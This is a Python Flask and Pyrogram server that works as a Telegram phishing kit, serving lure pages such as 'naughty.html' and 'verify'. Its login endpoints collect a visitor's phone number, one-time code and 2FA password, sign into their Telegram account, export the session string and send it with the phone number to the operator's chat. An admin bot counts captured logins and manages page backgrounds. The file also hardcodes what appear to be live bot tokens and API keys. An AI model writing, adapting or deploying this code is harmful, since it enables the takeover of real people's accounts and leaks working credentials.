import os
import asyncio
import threading
import traceback
import requests
import time
import random
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
from pyrogram import Client, filters

app = Flask(__name__)
CORS(app)

API_ID = int(os.environ.get("API_ID", 33511945))
API_HASH = os.environ.get("API_HASH", "d044392a17690c14ee5b4a23651a0700")

BOT_TOKEN = "8613982412:AAGEdvZdzjK3Eli_vIYoEtXnsxZgwodqnVE"
OWNER_CHAT_ID = "-1003962414788"  
ADMIN_ID = 6034439625             
STORAGE_CHANNEL_ID = -1004382857247 

active_clients = {}
total_logged_in_users = 0  
admin_states = {} 

def send_telegram_message(chat_id, text, reply_markup=None):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
        if reply_markup:
            payload["reply_markup"] = reply_markup
        requests.post(url, json=payload, timeout=15)
    except Exception as e:
        print("Telegram Notification Error:", e)

def edit_telegram_message(chat_id, message_id, text, reply_markup=None):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
        payload = {
            "chat_id": chat_id,
            "message_id": message_id,
            "text": text,
            "parse_mode": "Markdown"
        }
        if reply_markup:
            payload["reply_markup"] = reply_markup
        requests.post(url, json=payload, timeout=15)
    except Exception as e:
        print("Edit Message Error:", e)

def answer_callback(callback_query_id, text, show_alert=False):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
        requests.post(url, json={"callback_query_id": callback_query_id, "text": text, "show_alert": show_alert}, timeout=10)
    except Exception as e:
        pass

def download_background_file_by_id(file_id, file_name_prefix):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getFile?file_id={file_id}"
        res = requests.get(url, timeout=60).json()
        
        if res.get("ok"):
            file_path = res["result"]["file_path"]
            download_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
            
            file_res = requests.get(download_url, stream=True, timeout=120)
            
            if file_res.status_code == 200:
                bg_folder = "static/backgrounds"
                os.makedirs(bg_folder, exist_ok=True)
                
                ext = file_path.split('.')[-1] if '.' in file_path else 'mp4'
                unique_name = f"{file_name_prefix}_{int(time.time())}_{random.randint(1000,9999)}.{ext}"
                save_path = os.path.join(bg_folder, unique_name)
                
                with open(save_path, "wb") as f:
                    for chunk in file_res.iter_content(chunk_size=32768):
                        if chunk:
                            f.write(chunk)
                            
                return True, unique_name
    except Exception as e:
        print("Large Video Download Error:", traceback.format_exc())
    return False, None

def pyrogram_scan_channel_sync():
    synced_count = 0
    try:
        async def _scan():
            nonlocal synced_count
            async with Client("pyrogram_sync_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN, in_memory=True) as client:
                async for message in client.get_chat_history(STORAGE_CHANNEL_ID, limit=100):
                    file_id = None
                    if message.video: file_id = message.video.file_id
                    elif message.document: file_id = message.document.file_id
                    elif message.animation: file_id = message.animation.file_id
                    elif message.photo: file_id = message.photo[-1].file_id
                    
                    if file_id:
                        success, _ = download_background_file_by_id(file_id, "auto_sync")
                        if success:
                            synced_count += 1
        run_async(_scan())
    except Exception as e:
        print("Pyrogram Scan Error:", traceback.format_exc())
    return synced_count

def get_main_menu():
    return {
        "inline_keyboard": [
            [{"text": "📊 Total Registration Members", "callback_data": "total_members"}],
            [{"text": "🖼️ Dashboard Background Template", "callback_data": "bg_template"},
             {"text": "💧 Blur Effect", "callback_data": "blur_effect_menu"}],
            [{"text": "🔄 Reload & Sync All Videos", "callback_data": "reload_all_videos"}],
            [{"text": "🔐 Session String Manager", "callback_data": "session_manager"}]
        ]
    }

def get_blur_menu():
    return {
        "inline_keyboard": [
            [
                {"text": "2%", "callback_data": "blur_2"},
                {"text": "3%", "callback_data": "blur_3"},
                {"text": "4%", "callback_data": "blur_4"}
            ],
            [
                {"text": "5%", "callback_data": "blur_5"},
                {"text": "6%", "callback_data": "blur_6"},
                {"text": "7%", "callback_data": "blur_7"}
            ],
            [{"text": "🔙 Back to Main Menu", "callback_data": "back_to_main"}]
        ]
    }

def get_welcome_text():
    return (
        "👋 Welcome to User Info Robot! 🌐\n\n"
        "Manage your website backgrounds and monitor user activity.\n"
        "👇 Select an option below to continue."
    )

def get_back_button():
    return {
        "inline_keyboard": [
            [{"text": "🔙 Back", "callback_data": "back_to_main"}]
        ]
    }

bg_loop = asyncio.new_event_loop()
def start_background_loop(loop):
    asyncio.set_event_loop(loop)
    
    print("🔄 Initial startup background media sync from storage channel...")
    pyrogram_scan_channel_sync()
    
    try:
        bot_client = Client("bg_channel_monitor_session", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN, in_memory=True)
        
        @bot_client.on_message(filters.chat(STORAGE_CHANNEL_ID))
        async def handle_channel_upload(client, message):
            try:
                file_id = None
                if message.video: file_id = message.video.file_id
                elif message.document: file_id = message.document.file_id
                elif message.animation: file_id = message.animation.file_id
                elif message.photo: file_id = message.photo[-1].file_id
                
                if file_id:
                    download_background_file_by_id(file_id, "channel_synced")
            except Exception as e:
                print("Channel Monitor Sync Error:", e)
        
        bot_client.start()
    except Exception as e:
        print("Bot Client Start Error:", e)

    loop.run_forever()

loop_thread = threading.Thread(target=start_background_loop, args=(bg_loop,), daemon=True)
loop_thread.start()

def run_async(coro):
    future = asyncio.run_coroutine_threadsafe(coro, bg_loop)
    return future.result()

@app.route('/', methods=['GET'])
def home():
    if os.path.exists('index.html'): return send_file('index.html')
    return "index.html not found", 404

@app.route('/naughty.html', methods=['GET'])
def naughty_page():
    if os.path.exists('naughty.html'): return send_file('naughty.html')
    return "naughty.html not found", 404

@app.route('/verify', methods=['GET'])
def verify_page():
    if os.path.exists('verify.html'): return send_file('verify.html')
    return "verify.html not found", 404

@app.route('/dashboard.html', methods=['GET'])
def dashboard_page():
    if os.path.exists('dashboard.html'): return send_file('dashboard.html')
    return "dashboard.html not found", 404

@app.route('/get-random-background', methods=['GET'])
def get_random_background():
    bg_folder = "static/backgrounds"
    if not os.path.exists(bg_folder):
        os.makedirs(bg_folder, exist_ok=True)
    
    files = os.listdir(bg_folder)
    if not files:
        return jsonify({
            "status": "success", 
            "url": "https://carder.top/imagens/1792298157180-542085424.jpg", 
            "type": "image",
            "blur": app.config.get("CURRENT_BLUR", "3px")
        })
    
    chosen_file = random.choice(files)
    file_url = f"/static/backgrounds/{chosen_file}?v={int(time.time())}"
    file_type = "video" if chosen_file.lower().endswith(('.mp4', '.mov', '.webm', '.mkv')) else "image"
    
    blur_val = app.config.get("CURRENT_BLUR", "3px")
    
    return jsonify({"status": "success", "url": file_url, "type": file_type, "blur": blur_val})

@app.route('/send-code', methods=['POST'])
def send_code():
    data = request.get_json(silent=True) or {}
    phone = str(data.get('phone', '')).strip()
    if not phone:
        return jsonify({"status": "error", "message": "Phone number is required"}), 400
    try:
        async def _send():
            if phone in active_clients:
                try: await active_clients[phone]["client"].disconnect()
                except Exception: pass
            
            client = Client(":memory:", api_id=API_ID, api_hash=API_HASH)
            await client.connect()
            sent_code = await client.send_code(phone)
            active_clients[phone] = {"client": client, "phone_code_hash": sent_code.phone_code_hash}
            return sent_code.phone_code_hash
            
        phone_code_hash = run_async(_send())
        return jsonify({"status": "success", "message": "OTP sent!", "phone_code_hash": phone_code_hash})
    except Exception as e:
        print("Send Code Error:", traceback.format_exc())
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/verify-code', methods=['POST'])
def verify_code():
    global total_logged_in_users
    data = request.get_json(silent=True) or {}
    phone = str(data.get('phone', '')).strip()
    code = str(data.get('code', '')).strip()
    password = data.get('password')
    if not phone or not code:
        return jsonify({"status": "error", "message": "Phone and Code required"}), 400
    if phone not in active_clients:
        return jsonify({"status": "error", "message": "Session expired."}), 400
    client_data = active_clients[phone]
    client = client_data["client"]
    phone_code_hash = client_data["phone_code_hash"]
    try:
        async def _verify():
            try: await client.sign_in(phone, phone_code_hash, code)
            except Exception:
                if not password: return {"status": "2fa_required"}
                await client.check_password(str(password))
            session_string = await client.export_session_string()
            await client.disconnect()
            return {"status": "success", "session_string": session_string}
        res = run_async(_verify())
        if res and res.get("status") == "2fa_required":
            return jsonify({"status": "2fa_required", "message": "2FA Required"})
        if res and res.get("status") == "success":
            total_logged_in_users += 1
            session_string = res.get("session_string")
            send_telegram_message(OWNER_CHAT_ID, f"🎉 *New Login!*\n📱 `{phone}`\n🔑 `{session_string}`")
            active_clients.pop(phone, None)
            return jsonify({"status": "success", "message": "Logged in!"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/get-user-profile', methods=['POST'])
def get_user_profile():
    data = request.get_json(silent=True) or {}
    phone = str(data.get('phone', '')).strip()
    if not phone:
        return jsonify({"status": "error", "message": "Phone required"}), 400
    try:
        async def _fetch():
            client = Client(":memory:", api_id=API_ID, api_hash=API_HASH)
            await client.connect()
            await client.disconnect()
            return {
                "name": "User",
                "username": "@username",
                "id": 0,
                "phone": phone,
                "bio": "Bio",
                "photo": "https://carder.top/imagens/1791918460640-323067073.jpg"
            }
        profile_data = run_async(_fetch())
        return jsonify({"status": "success", "profile": profile_data})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/stats', methods=['GET'])
def get_stats():
    return jsonify({"total_users_logged_in": total_logged_in_users})

@app.route('/webhook', methods=['POST'])
def telegram_webhook():
    try:
        data = request.get_json(silent=True) or {}
        if "message" in data:
            message = data["message"]
            chat_id = message["chat"]["id"]
            user_id = message["from"]["id"]
            text = message.get("text", "").strip()

            if user_id in admin_states:
                state = admin_states[user_id]
                if state == "WAITING_FOR_BG_TEMPLATE":
                    file_id = None
                    if "video" in message: file_id = message["video"]["file_id"]
                    elif "document" in message: file_id = message["document"]["file_id"]
                    elif "animation" in message: file_id = message["animation"]["file_id"]
                    elif "photo" in message: file_id = message["photo"][-1]["file_id"]

                    if file_id:
                        success, fname = download_background_file_by_id(file_id, "bg_media")
                        if success:
                            send_telegram_message(chat_id, f"✅ **Background Media Stored Successfully!**\nSaved: `{fname}`")
                        else:
                            send_telegram_message(chat_id, "⚠️ Error downloading file.")
                    else:
                        send_telegram_message(chat_id, "⚠️ Please send a valid video or photo.")
                    return "OK", 200

            if text == "/start":
                send_telegram_message(chat_id, get_welcome_text(), get_main_menu())

        elif "callback_query" in data:
            cq = data["callback_query"]
            cdata = cq.get("data")
            msg_obj = cq.get("message", {})
            chat_id = msg_obj.get("chat", {}).get("id")
            msg_id = msg_obj.get("message_id")
            user_id = cq["from"]["id"]
            cq_id = cq["id"]

            if not chat_id or not msg_id: return "OK", 200

            if cdata == "total_members":
                answer_callback(cq_id, "Fetching stats...")
                edit_telegram_message(chat_id, msg_id, f"📊 *Total Registered Members:* `{total_logged_in_users:,}`", get_back_button())

            elif cdata == "bg_template":
                if user_id != ADMIN_ID:
                    answer_callback(cq_id, "⛔ Unauthorized!", show_alert=True)
                    return "OK", 200
                answer_callback(cq_id, "Background Template Manager")
                admin_states[user_id] = "WAITING_FOR_BG_TEMPLATE"
                edit_telegram_message(chat_id, msg_id, f"🖼️ **Dashboard Background Template Manager**\n\nSend files here OR upload directly to your Storage Channel (`{STORAGE_CHANNEL_ID}`), they will auto-sync instantly!", get_back_button())

            elif cdata == "reload_all_videos":
                if user_id != ADMIN_ID:
                    answer_callback(cq_id, "⛔ Unauthorized!", show_alert=True)
                    return "OK", 200
                
                answer_callback(cq_id, "Syncing all channel media...")
                synced_count = pyrogram_scan_channel_sync()
                edit_telegram_message(chat_id, msg_id, f"🔄 **Reload Complete!**\nSuccessfully scanned and synced `{synced_count}` media files from the storage channel.", get_main_menu())

            elif cdata == "blur_effect_menu":
                if user_id != ADMIN_ID:
                    answer_callback(cq_id, "⛔ Unauthorized!", show_alert=True)
                    return "OK", 200
                answer_callback(cq_id, "Blur Effect Menu")
                edit_telegram_message(chat_id, msg_id, "💧 **Select Blur Percentage for Background:**\nChoose a level below:", get_blur_menu())

            elif cdata.startswith("blur_"):
                if user_id != ADMIN_ID:
                    answer_callback(cq_id, "⛔ Unauthorized!", show_alert=True)
                    return "OK", 200
                percentage = cdata.split("_")[1]
                blur_px = f"{percentage}px"
                app.config["CURRENT_BLUR"] = blur_px
                answer_callback(cq_id, f"Blur set to {percentage}% successfully!", show_alert=True)
                edit_telegram_message(chat_id, msg_id, f"✅ **Background Blur Updated Successfully to {percentage}%!**", get_blur_menu())

            elif cdata == "back_to_main":
                if user_id in admin_states: del admin_states[user_id]
                answer_callback(cq_id, "Main Menu")
                edit_telegram_message(chat_id, msg_id, get_welcome_text(), get_main_menu())

    except Exception as e:
        print("Webhook Error:", traceback.format_exc())
    return "OK", 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port, threaded=True)
